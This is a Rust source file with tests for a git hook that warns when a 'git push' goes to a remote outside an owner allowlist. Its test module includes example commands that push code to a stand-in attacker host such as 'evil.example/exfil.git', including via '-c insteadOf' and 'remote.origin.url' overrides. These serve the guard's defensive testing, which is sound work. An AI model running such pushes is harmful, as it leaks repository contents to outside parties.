//! Nudge when a `git push` goes to a repository the operator does not own.
//!
//! A nudge, never a block (cadence-ecosystem ADR-0046, phase 2,
//! cameronsjo/cadence-hooks#1443). The guard speaks only when it read the
//! push's remote exactly: a literal URL, a remote name git resolves, or a bare
//! push's tracking remote, in a directory the push walk followed. When that
//! remote's owner is not on the allowlist, it names the remote and the action.
//! Anything it cannot read for certain (a variable, an unfollowed `cd` or
//! `git -C "$X"`, an `eval` that may move, a `-c` override, a wrapper it
//! cannot peel, a probe timeout, an unset allowlist) allows with no output.
//! Phase 3's `pre-push` hook replaces this guard with one that sees git's real
//! remote (cameronsjo/cadence-hooks#1444).

use cadence_hooks_core::config::{self, AllowEntry, env_allow_entries, env_extra_hosts};
use cadence_hooks_core::display::{MAX_PATH_DISPLAY, sanitize_field};
use cadence_hooks_core::push::{PushInvocation, push_locations_reading};
use cadence_hooks_core::shell::{
    GitQuery, UnreadEval, git_command_detailed, git_push_segments, host_and_repo_from_url,
    strip_group_wrappers,
};
use cadence_hooks_core::{Check, CheckResult, HookInput};

/// Does the command mention `push` at all, in any case? A cheap prefilter:
/// everything past it goes to the push walk, which decides whether a push is
/// really in command position. Scanning bytes keeps the common case
/// allocation-free.
fn mentions_push(command: &str) -> bool {
    command
        .as_bytes()
        .windows(4)
        .any(|w| w.eq_ignore_ascii_case(b"push"))
}

/// Check if a URL's owner is in the allowed list.
fn check_owner(
    url: &str,
    allowed_owners: &[AllowEntry],
    allowed_repos: &[AllowEntry],
    extra_hosts: &[String],
) -> bool {
    let Some((host, repo_path)) = host_and_repo_from_url(url) else {
        return false;
    };
    let mut parts = repo_path.splitn(2, '/');
    let owner = parts.next().unwrap_or("");
    let repo = parts.next().unwrap_or("");
    config::is_allowed_with_extra_hosts(
        &host,
        owner,
        repo,
        allowed_owners,
        allowed_repos,
        extra_hosts,
    )
}

/// Push-URL resolution outcome. Both failures allow: `Failed` (no such
/// remote, a refspec read as one, not a repository) leaves git to refuse the
/// push, and `TimedOut` (the #271 subprocess deadline) is the guard's own
/// infrastructure failing.
enum PushUrlResolution {
    Url(String),
    Failed,
    TimedOut,
}

/// Resolve the push URL for a git repo.
fn resolve_push_url(work_dir: &str, explicit_remote: Option<&str>) -> PushUrlResolution {
    let get_url = |remote: &str| match git_command_detailed(
        work_dir,
        &["remote", "get-url", "--push", remote],
    ) {
        GitQuery::Value(url) => PushUrlResolution::Url(url),
        GitQuery::Failed => PushUrlResolution::Failed,
        GitQuery::TimedOut => PushUrlResolution::TimedOut,
    };

    if let Some(remote) = explicit_remote {
        return get_url(remote);
    }

    // No explicit remote — find where bare push would go
    let branch = match git_command_detailed(work_dir, &["branch", "--show-current"]) {
        GitQuery::Value(branch) => branch,
        GitQuery::Failed => return PushUrlResolution::Failed,
        GitQuery::TimedOut => return PushUrlResolution::TimedOut,
    };
    // git's own order for where a bare push goes: `branch.<b>.pushRemote`,
    // then `remote.pushDefault`, then `branch.<b>.remote`, then `origin`
    // (cadence-hooks#1156).
    for key in [
        format!("branch.{branch}.pushRemote"),
        "remote.pushDefault".to_string(),
        format!("branch.{branch}.remote"),
    ] {
        match git_command_detailed(work_dir, &["config", &key]) {
            GitQuery::Value(remote) if !remote.is_empty() => return get_url(&remote),
            // Not configured is a normal git state — try the next key.
            GitQuery::Value(_) | GitQuery::Failed => {}
            GitQuery::TimedOut => return PushUrlResolution::TimedOut,
        }
    }
    get_url("origin")
}

/// The nudge for a push whose remote is not on the allowlist. It names the
/// remote, the directory, the allowlist and the two actions.
fn unowned_nudge(
    url: &str,
    work_dir: &str,
    allowed_owners: &[AllowEntry],
    allowed_repos: &[AllowEntry],
    extra_hosts: &[String],
) -> String {
    let all_entries: Vec<String> = allowed_owners
        .iter()
        .chain(allowed_repos.iter())
        .map(|e| e.to_string())
        .collect();

    // If the URL host isn't the default and isn't in extra_hosts, the user
    // likely tripped over host-scoping. Say how to qualify the entry.
    let url_host = host_and_repo_from_url(url).map(|(h, _)| h);
    let default = config::default_host();
    let host_hint = url_host
        .as_deref()
        .filter(|h| *h != default && !extra_hosts.iter().any(|e| e == h))
        .map(|h| {
            format!(
                "\n   Host scope:    {}",
                crate::messages::host_scope_advice(&default, h)
            )
        })
        .unwrap_or_default();

    // The URL is often read from `.git/config`, so it is not the guard's own
    // text either (cameronsjo/cadence-hooks#1526), and its userinfo can hold
    // a token (cameronsjo/cadence-hooks#1541).
    let url = crate::messages::shown_url(url);
    let work_dir = sanitize_field(work_dir, MAX_PATH_DISPLAY);
    format!(
        "⚠️  git-guardrails: Push target is not on your allowlist\n   \
         Would push to: {url}\n   \
         Directory:     {work_dir}\n   \
         Allowed:       {}{host_hint}\n\n   \
         Confirm this is the remote you mean, or push to your fork instead: \
         git push <fork-remote> <branch>",
        all_entries.join(" ")
    )
}

/// At most this many distinct (directory, remote) pairs are probed per
/// command. Each costs git subprocesses against the shared #271 deadline, and
/// the count is the command's to choose. A push that would need a probe past
/// it is not judged; a literal URL needs none and still is.
const MAX_PROBES: usize = 4;

/// Git subcommands that neither check out another branch nor change where
/// one tracks, in the forms [`moves_branch_or_tracking`] does not single out
/// (`rebase <upstream> <branch>`, `branch -u`, `worktree add`, …).
/// Everything else a chain runs through `git` (`checkout`, `switch`,
/// `bisect`, an alias, a subcommand built by an expansion) counts as a
/// possible switch.
const NON_SWITCHING_SUBCOMMANDS: &[&str] = &[
    "add",
    "am",
    "apply",
    "blame",
    "branch",
    "cat-file",
    "cherry",
    "cherry-pick",
    "clean",
    "commit",
    "config",
    "count-objects",
    "describe",
    "diff",
    "fetch",
    "for-each-ref",
    "format-patch",
    "fsck",
    "gc",
    "grep",
    "init",
    "lfs",
    "log",
    "ls-files",
    "ls-remote",
    "ls-tree",
    "maintenance",
    "merge",
    "merge-base",
    "mv",
    "notes",
    "prune",
    "pull",
    "push",
    "range-diff",
    "rebase",
    "reflog",
    "remote",
    "reset",
    "restore",
    "rev-list",
    "rev-parse",
    "revert",
    "rm",
    "shortlog",
    "show",
    "show-ref",
    "sparse-checkout",
    "stash",
    "status",
    "submodule",
    "tag",
    "verify-commit",
    "verify-tag",
    "whatchanged",
    "worktree",
];

/// Can a segment of the command move which branch is checked out, or where
/// the current branch tracks, before a later bare push resolves its remote?
/// Then the tracking remote read before the command runs is not the one a
/// bare push uses, so a bare push is not judged. Any `git` call is taken to,
/// unless its subcommand is a literal in [`NON_SWITCHING_SUBCOMMANDS`] (and
/// not `stash branch`, a `fetch`/`pull` with `--set-upstream`, a `rebase`
/// naming a branch or `--root`, a `branch` with a tracking option or
/// `-f <name> <start>`, a `worktree add`, nor a `config` that names a
/// `branch.*`/`remote.*`/push key or opens the editor); so are
/// `gh pr checkout`, a dashed `git-*` or `hub` command, and a command word
/// built by an expansion.
fn moves_branch_or_tracking(command: &str) -> bool {
    use cadence_hooks_core::shell::{
        command_segments, command_word, executable_tokens, peel_command_runners,
        skip_git_global_options, unescape_word,
    };
    command_segments(command).iter().any(|segment| {
        let tokens = executable_tokens(strip_group_wrappers(segment));
        let argv = peel_command_runners(&tokens);
        let Some(first) = argv.first() else {
            return false;
        };
        if first.contains(['$', '`']) {
            return true;
        }
        let name = command_word(first);
        match name.as_ref() {
            "git" => {
                let rest = skip_git_global_options(&argv[1..]);
                let words: Vec<String> =
                    rest.iter().map(|w| unescape_word(w).into_owned()).collect();
                let Some(sub) = words.first() else {
                    return false;
                };
                if sub.contains(['$', '`']) || !NON_SWITCHING_SUBCOMMANDS.contains(&sub.as_str()) {
                    return true;
                }
                match sub.as_str() {
                    "stash" => words.get(1).is_some_and(|w| w == "branch"),
                    // `--set-upstream` (git takes any unique prefix) records
                    // the fetched branch as the current one's upstream.
                    "fetch" | "pull" => words[1..].iter().any(|w| w.starts_with("--set-u")),
                    // Checking out its last positional when it names two
                    // (`rebase <upstream> <branch>`), or rewriting from the
                    // root.
                    "rebase" => {
                        let mut positionals = 0;
                        let mut args = words[1..].iter();
                        while let Some(w) = args.next() {
                            if w == "--root" {
                                return true;
                            }
                            if matches!(
                                w.as_str(),
                                "--onto"
                                    | "-x"
                                    | "--exec"
                                    | "-s"
                                    | "--strategy"
                                    | "-X"
                                    | "--strategy-option"
                            ) {
                                args.next();
                            } else if !w.starts_with('-') {
                                positionals += 1;
                            }
                        }
                        positionals >= 2
                    }
                    // A tracking option, or `-f <name> <start>` resetting a
                    // branch; listing, deleting and renaming (whose tracking
                    // moves with it) do not count.
                    "branch" => {
                        let args = &words[1..];
                        let force = args.iter().any(|w| w == "-f" || w == "--force");
                        let positionals = args.iter().filter(|w| !w.starts_with('-')).count();
                        (force && positionals >= 2)
                            || args.iter().any(|w| {
                                w.starts_with("--set-upstream")
                                    || w.starts_with("--track")
                                    || w == "--unset-upstream"
                                    || (w.starts_with('-')
                                        && !w.starts_with("--")
                                        && w.contains(['u', 't']))
                            })
                    }
                    "worktree" => words.get(1).is_some_and(|w| w == "add"),
                    "config" => words[1..].iter().any(|w| {
                        let w = w.to_ascii_lowercase();
                        w.starts_with("branch.")
                            || w.starts_with("remote.")
                            || w.contains("push")
                            || w == "-e"
                            || w == "--edit"
                            || w.contains(['$', '`'])
                    }),
                    _ => false,
                }
            }
            "gh" => {
                let words: Vec<String> = argv[1..]
                    .iter()
                    .map(|w| unescape_word(w).into_owned())
                    .collect();
                words.iter().any(|w| w == "checkout")
                    && words.iter().any(|w| w == "pr" || w == "co")
            }
            "hub" => true,
            other => other.starts_with("git-"),
        }
    })
}

/// The directory the command starts in: the payload's `cwd`, else the hook
/// process's own.
fn input_cwd(input: &HookInput) -> String {
    input.cwd.clone().unwrap_or_else(|| {
        std::env::current_dir()
            .ok()
            .and_then(|p| p.to_str().map(String::from))
            .unwrap_or_else(|| ".".to_string())
    })
}

/// A push the walk read exactly: it runs in a directory the walk followed,
/// with no redirect, alias or `-c` override changing where it goes.
fn read_exactly(push: &PushInvocation) -> bool {
    !push.repository_unresolved
        && !push.directory_unverified
        && !push.destination_unreadable
        && !push.via_alias
        && push.config_destinations.is_empty()
        && push.config_remotes.is_empty()
}

/// Nudges when a `git push` goes to a remote the operator does not own.
pub struct PushRemoteGuard;

impl Check for PushRemoteGuard {
    fn name(&self) -> &str {
        "guard-push-remote"
    }

    fn run(&self, input: &HookInput) -> CheckResult {
        judge_push(input).map_or_else(CheckResult::allow, CheckResult::nudge)
    }
}

/// The nudge text for the first push whose remote is read exactly and not
/// owned, or `None`.
fn judge_push(input: &HookInput) -> Option<String> {
    let command = input.command()?;
    if !mentions_push(command) {
        return None;
    }
    let allowed_owners = env_allow_entries("CADENCE_ALLOWED_OWNERS");
    // No allowlist: nothing to judge against. `doctor` reports the unset
    // allowlist.
    if allowed_owners.is_empty() {
        return None;
    }
    let allowed_repos = env_allow_entries("CADENCE_ALLOWED_REPOS");
    let extra_hosts = env_extra_hosts();

    // An `eval` whose script needs expansion (`eval "$(direnv export bash)"`)
    // leaves the push where the walk read it (cameronsjo/cadence-hooks#1530).
    let pushes = push_locations_reading(command, &input_cwd(input), UnreadEval::StaysPut);
    // `git push --help` (or `-h`) prints usage and pushes nothing. Only when
    // every push the walk found is such a top-level segment, so a real push
    // in a child script beside it is still judged.
    let segments = git_push_segments(command);
    if !segments.is_empty()
        && segments.len() == pushes.len()
        && segments
            .iter()
            .all(|words| words.iter().any(|w| w == "--help" || w == "-h"))
    {
        return None;
    }
    let mut probed: Vec<(&str, Option<&str>)> = Vec::new();
    let mut bare_judged: Option<bool> = None;
    for push in pushes.iter().filter(|push| read_exactly(push)) {
        let remote = push.repository.as_deref();
        let url = match remote {
            // Built by the shell at run time: not read exactly.
            Some(r) if r.contains(['$', '`']) => continue,
            Some(r) if host_and_repo_from_url(r).is_some() => r.to_string(),
            _ => {
                // A bare push resolves the branch's tracking remote as it is
                // before the command runs; an earlier branch switch in the
                // same command can send it elsewhere.
                if remote.is_none()
                    && !*bare_judged.get_or_insert_with(|| !moves_branch_or_tracking(command))
                {
                    continue;
                }
                let pair = (push.work_dir.as_str(), remote);
                if probed.contains(&pair) {
                    continue;
                }
                if probed.len() >= MAX_PROBES {
                    continue;
                }
                probed.push(pair);
                match resolve_push_url(&push.work_dir, remote) {
                    PushUrlResolution::Url(url) => url,
                    // A refspec, a local path, a typo or no repository: git
                    // answers for itself.
                    PushUrlResolution::Failed => continue,
                    PushUrlResolution::TimedOut => return None,
                }
            }
        };
        if !check_owner(&url, &allowed_owners, &allowed_repos, &extra_hosts) {
            return Some(unowned_nudge(
                &url,
                &push.work_dir,
                &allowed_owners,
                &allowed_repos,
                &extra_hosts,
            ));
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    use cadence_hooks_core::config::parse_allow_entry;

    fn owners(entries: &[&str]) -> Vec<AllowEntry> {
        entries.iter().map(|e| parse_allow_entry(e)).collect()
    }

    // `check_owner` matches a bare owner against `config::default_host()`,
    // which reads `GH_HOST`. The tests whose verdict turns on that match pin it
    // cleared, so a shell that exports a GHE host cannot fail them.

    #[test]
    fn owner_check_passes() {
        with_env(&[("GH_HOST", None)], || {
            assert!(check_owner(
                "https://github.com/cameronsjo/repo.git",
                &owners(&["cameronsjo"]),
                &[],
                &[],
            ));
        });
    }

    #[test]
    fn owner_check_fails() {
        assert!(!check_owner(
            "https://github.com/other/repo.git",
            &owners(&["cameronsjo"]),
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_multiple_owners() {
        with_env(&[("GH_HOST", None)], || {
            assert!(check_owner(
                "https://github.com/cameronsjo/repo.git",
                &owners(&["other", "cameronsjo"]),
                &[],
                &[],
            ));
        });
    }

    #[test]
    fn owner_check_empty_list() {
        assert!(!check_owner(
            "https://github.com/cameronsjo/repo.git",
            &[],
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_case_insensitive() {
        with_env(&[("GH_HOST", None)], || {
            assert!(check_owner(
                "https://github.com/CameronSjo/repo.git",
                &owners(&["cameronsjo"]),
                &[],
                &[],
            ));
        });
    }

    // --- host-aware matching ---

    #[test]
    fn owner_check_host_qualified() {
        assert!(check_owner(
            "https://gitea.internal/cameron/cadence.git",
            &owners(&["gitea.internal/cameron"]),
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_host_mismatch_blocked() {
        // bare "cameron" defaults to github.com — should NOT match gitea.internal
        assert!(!check_owner(
            "https://gitea.internal/cameron/cadence.git",
            &owners(&["cameron"]),
            &[],
            &[],
        ));
    }

    #[test]
    fn owner_check_mixed_hosts() {
        with_env(&[("GH_HOST", None)], || {
            let o = owners(&["cameronsjo", "gitea.internal/cameron"]);
            // github.com/cameronsjo → allowed
            assert!(check_owner(
                "https://github.com/cameronsjo/repo.git",
                &o,
                &[],
                &[],
            ));
            // gitea.internal/cameron → allowed
            assert!(check_owner(
                "git@gitea.internal:cameron/repo.git",
                &o,
                &[],
                &[]
            ));
            // gitea.internal/cameronsjo → blocked
            assert!(!check_owner(
                "https://gitea.internal/cameronsjo/repo.git",
                &o,
                &[],
                &[],
            ));
            // github.com/cameron → blocked
            assert!(!check_owner(
                "https://github.com/cameron/repo.git",
                &o,
                &[],
                &[]
            ));
        });
    }

    #[test]
    fn owner_check_allowed_repo() {
        with_env(&[("GH_HOST", None)], || {
            let repos = owners(&["external/shared-repo"]);
            assert!(check_owner(
                "https://github.com/external/shared-repo.git",
                &[],
                &repos,
                &[],
            ));
        });
    }

    #[test]
    fn no_command_allowed() {
        let input = HookInput {
            tool_name: Some("Bash".into()),
            tool_input: None,
            cwd: None,
            ..Default::default()
        };
        let result = PushRemoteGuard.run(&input);
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
    }

    #[test]
    fn non_push_command_allowed() {
        let input = HookInput {
            tool_name: Some("Bash".into()),
            tool_input: Some(cadence_hooks_core::ToolInput {
                file_path: None,
                path: None,
                command: Some("git status".into()),
                content: None,
                new_string: None,
                old_string: None,
                ..Default::default()
            }),
            cwd: None,
            ..Default::default()
        };
        let result = PushRemoteGuard.run(&input);
        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
    }

    // --- check_owner: additional URL formats ---

    #[test]
    fn owner_check_ssh_url() {
        with_env(&[("GH_HOST", None)], || {
            assert!(check_owner(
                "git@github.com:cameronsjo/repo.git",
                &owners(&["cameronsjo"]),
                &[],
                &[],
            ));
        });
    }

    #[test]
    fn owner_check_https_no_git_suffix() {
        with_env(&[("GH_HOST", None)], || {
            assert!(check_owner(
                "https://github.com/cameronsjo/repo",
                &owners(&["cameronsjo"]),
                &[],
                &[],
            ));
        });
    }

    #[test]
    fn owner_check_malformed_returns_false() {
        assert!(!check_owner(
            "not-a-url",
            &owners(&["cameronsjo"]),
            &[],
            &[]
        ));
    }

    // --- check_owner: extra_hosts (issue #15) ---

    #[test]
    fn owner_check_extra_hosts_unlocks_self_hosted_forge() {
        // Repro for cadence-hooks#15: bare `cameron` matches a self-hosted
        // Gitea host once it's listed in extra_hosts.
        let extras = vec!["git.sjo.lol".to_string()];
        assert!(check_owner(
            "https://git.sjo.lol/cameron/runelite-plugins.git",
            &owners(&["cameron"]),
            &[],
            &extras,
        ));
    }

    #[test]
    fn owner_check_extra_hosts_does_not_unlock_unlisted_host() {
        let extras = vec!["git.sjo.lol".to_string()];
        assert!(!check_owner(
            "https://evil.example/cameron/repo.git",
            &owners(&["cameron"]),
            &[],
            &extras,
        ));
    }

    #[test]
    fn owner_check_extra_hosts_preserves_default_host_match() {
        with_env(&[("GH_HOST", None)], || {
            let extras = vec!["git.sjo.lol".to_string()];
            assert!(check_owner(
                "https://github.com/cameron/repo.git",
                &owners(&["cameron"]),
                &[],
                &extras,
            ));
        });
    }

    // --- PushRemoteGuard::run() ---
    //
    // run() reads CADENCE_ALLOWED_OWNERS from the process-global environment,
    // so these tests serialize via the crate-shared with_env lock and restore
    // prior values (#446). Each runs in a hermetic fixture repository.

    use crate::with_env;
    use cadence_hooks_core::Outcome;
    use cadence_hooks_core::test_builders::make_bash_with_cwd;

    const OWNED: &str = "https://github.com/cameronsjo/x.git";
    const UNOWNED: &str = "https://github.com/work-org/y.git";

    /// A repo in a new tempdir with each `(name, url)` of `remotes` added. Not
    /// `crate::repo_with_remotes`, which is Unix-only: these tests run on
    /// Windows too.
    fn repo_with_remotes(remotes: &[(&str, &str)]) -> tempfile::TempDir {
        let repo = tempfile::tempdir().expect("create hermetic git fixture");
        cadence_hooks_core::git_fixtures::init_repo(repo.path());
        for (name, url) in remotes {
            cadence_hooks_core::git_fixtures::git_in(repo.path(), &["remote", "add", name, url]);
        }
        repo
    }

    /// Allowlist = `cameronsjo` only, on the default `github.com` host.
    fn owners_only() -> Vec<(&'static str, Option<&'static str>)> {
        vec![
            ("CADENCE_ALLOWED_OWNERS", Some("cameronsjo")),
            ("CADENCE_ALLOWED_REPOS", None),
            ("CADENCE_EXTRA_HOSTS", None),
            ("CDPATH", None),
            ("GH_HOST", None),
        ]
    }

    fn run_in(command: &str, cwd: &std::path::Path) -> CheckResult {
        let cwd = cwd.to_str().expect("utf-8 path");
        with_env(&owners_only(), || {
            PushRemoteGuard.run(&make_bash_with_cwd(command, cwd))
        })
    }

    #[test]
    fn a_push_to_an_owned_remote_is_silent() {
        let repo = repo_with_remotes(&[("origin", OWNED), ("backup", OWNED)]);
        for command in [
            "git push origin feat/x",
            "git push",
            "git push -u origin HEAD",
            "git push origin main && git push backup main",
            "git add . && git commit -m wip && git push",
            &format!("git push {OWNED} main"),
            "git status",
            "git pull --rebase",
        ] {
            let result = run_in(command, repo.path());
            assert_eq!(
                result.outcome,
                Outcome::Allow,
                "{command}: {:?}",
                result.message
            );
            assert!(result.message.is_none(), "{command}: {:?}", result.message);
        }
    }

    /// Every remote read exactly and not owned nudges, names the remote, and
    /// names the action. None of them blocks.
    #[test]
    fn a_push_to_an_unowned_remote_nudges_and_names_it() {
        let repo = repo_with_remotes(&[("origin", UNOWNED), ("mine", OWNED)]);
        let owned = repo_with_remotes(&[("origin", OWNED)]);
        let unowned_dir = repo.path().to_str().expect("utf-8 path");
        let mut rows = vec![
            ("git push origin main".to_string(), repo.path()),
            ("git push".to_string(), repo.path()),
            (
                "git push mine main && git push origin main".to_string(),
                repo.path(),
            ),
            (format!("git push {UNOWNED} main"), owned.path()),
            (
                "git push https://evil.example/a/b.git HEAD:main".to_string(),
                owned.path(),
            ),
            (
                "git push --help; bash -c 'git push origin main'".to_string(),
                repo.path(),
            ),
            (
                "for b in a b; do git push origin $b; done".to_string(),
                repo.path(),
            ),
        ];
        // A Windows temp path is full of backslashes, which bash reads as
        // escapes, so the directory rows run on Unix only.
        if cfg!(unix) {
            rows.extend([
                (
                    format!("cd {unowned_dir} && git push origin main"),
                    owned.path(),
                ),
                (
                    format!("git -C {unowned_dir} push origin main"),
                    owned.path(),
                ),
                (format!("bash -c 'git -C {unowned_dir} push'"), owned.path()),
            ]);
        }
        for (command, cwd) in rows {
            let result = run_in(&command, cwd);
            assert_eq!(
                result.outcome,
                Outcome::Nudge,
                "{command}: {:?}",
                result.message
            );
            let text = result.message.unwrap_or_default();
            assert!(text.contains("not on your allowlist"), "{command}: {text}");
            assert!(text.contains("Would push to: "), "{command}: {text}");
            assert!(text.contains("push to your fork"), "{command}: {text}");
        }
    }

    #[test]
    fn the_nudge_names_the_host_scope_for_a_self_hosted_forge() {
        let repo = repo_with_remotes(&[("origin", "https://git.example.com/cameron/tool.git")]);
        let result = run_in("git push origin main", repo.path());
        assert_eq!(result.outcome, Outcome::Nudge, "{:?}", result.message);
        let text = result.message.unwrap_or_default();
        assert!(
            text.contains("CADENCE_EXTRA_HOSTS=git.example.com"),
            "{text}"
        );
    }

    /// Whatever the guard cannot read exactly allows with no output
    /// (cadence-ecosystem ADR-0046 rule 3), even from an unowned checkout.
    #[test]
    fn a_push_it_cannot_read_exactly_is_silent() {
        let repo = repo_with_remotes(&[("origin", UNOWNED)]);
        for command in [
            "git push \"$REMOTE\" main",
            "git push `cat remote.txt` main",
            "cd \"$REPO\" && git push origin main",
            "git -C \"$X\" push origin main",
            "S='cd /other'; eval \"$S\"; git push origin feat",
            "eval 'echo hi'; git push origin feat",
            "GIT_DIR=/elsewhere/.git git push origin main",
            "git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main",
            "git -c remote.origin.url=https://github.com/evil/x.git push origin main",
            "git -c remote.pushDefault=origin push",
            "git checkout other && git push",
            "git push https://evil.example/exfil.git main",
            "git push no-such-remote main",
            "git push --help",
            "git push -h",
            "git commit -m \"remember to git push https://github.com/x/y.git\"",
            "echo 'git push https://github.com/evil/x.git main'",
        ] {
            let result = run_in(command, repo.path());
            assert_eq!(
                result.outcome,
                Outcome::Allow,
                "{command}: {:?}",
                result.message
            );
            assert!(result.message.is_none(), "{command}: {:?}", result.message);
        }
    }

    #[test]
    fn an_unset_allowlist_is_silent() {
        let repo = repo_with_remotes(&[("origin", UNOWNED)]);
        let cwd = repo.path().to_str().expect("utf-8 path");
        let result = with_env(&[("CADENCE_ALLOWED_OWNERS", None)], || {
            PushRemoteGuard.run(&make_bash_with_cwd("git push origin main", cwd))
        });
        assert_eq!(result.outcome, Outcome::Allow, "{:?}", result.message);
        assert!(result.message.is_none(), "{:?}", result.message);
    }

    #[test]
    fn a_push_outside_a_repository_is_silent() {
        let dir = tempfile::tempdir().expect("temp dir");
        let result = run_in("git push origin main", dir.path());
        assert_eq!(result.outcome, Outcome::Allow, "{:?}", result.message);
        assert!(result.message.is_none(), "{:?}", result.message);
    }

    /// A command past the loop parser's 12 KB cap is still judged: the push
    /// walk has no such cap, so a long commit message or comment beside a
    /// push to an unowned remote does not silence the nudge.
    #[test]
    fn a_push_in_a_command_past_the_parse_cap_still_nudges() {
        let owned = repo_with_remotes(&[("origin", OWNED)]);
        let unowned = repo_with_remotes(&[("origin", UNOWNED)]);
        let pad = "x".repeat(cadence_hooks_core::loop_analysis::MAX_PARSE_BYTES);
        for (command, cwd) in [
            (format!("git push {UNOWNED} main\n# {pad}"), owned.path()),
            (format!("git commit -m '{pad}' && git push"), unowned.path()),
        ] {
            assert!(command.len() > cadence_hooks_core::loop_analysis::MAX_PARSE_BYTES);
            let result = run_in(&command, cwd);
            assert_eq!(
                result.outcome,
                Outcome::Nudge,
                "{:.40}…: {:?}",
                command,
                result.message
            );
        }
    }

    /// No more than [`MAX_PROBES`] distinct remotes are resolved; the rest
    /// are not judged. A literal URL is judged wherever it sits.
    #[test]
    fn pushes_past_the_probe_cap_are_not_judged() {
        let repo = repo_with_remotes(&[
            ("r1", OWNED),
            ("r2", OWNED),
            ("r3", OWNED),
            ("r4", OWNED),
            ("r5", UNOWNED),
        ]);
        let five = "git push r1 main; git push r2 main; git push r3 main; \
                    git push r4 main; git push r5 main";
        assert_eq!(run_in(five, repo.path()).outcome, Outcome::Allow);
        let four = "git push r1 main; git push r2 main; git push r3 main; git push r5 main";
        assert_eq!(run_in(four, repo.path()).outcome, Outcome::Nudge);
        // A literal URL needs no probe, so the cap does not hide it.
        let url = format!("{five}; git push {UNOWNED} main");
        assert_eq!(run_in(&url, repo.path()).outcome, Outcome::Nudge);
    }

    /// A made-up token, built so no provider-shaped literal sits in source.
    fn url_token() -> String {
        ["gh", "p_"].concat() + &"a1B2".repeat(9)
    }

    /// The URL is often read from `.git/config`: its userinfo is masked
    /// (cameronsjo/cadence-hooks#1541).
    #[test]
    fn the_nudge_masks_a_token_in_the_url() {
        let token = url_token();
        let with_token = format!("https://x-access-token:{token}@github.com/work-org/y.git");
        let repo = repo_with_remotes(&[("origin", &with_token)]);
        let result = run_in("git push origin main", repo.path());
        assert_eq!(result.outcome, Outcome::Nudge, "{:?}", result.message);
        let text = result.message.unwrap_or_default();
        assert!(!text.contains(&token), "{text}");
        assert!(
            text.contains("Would push to: https://***@github.com/work-org/y.git"),
            "{text}"
        );
    }
}
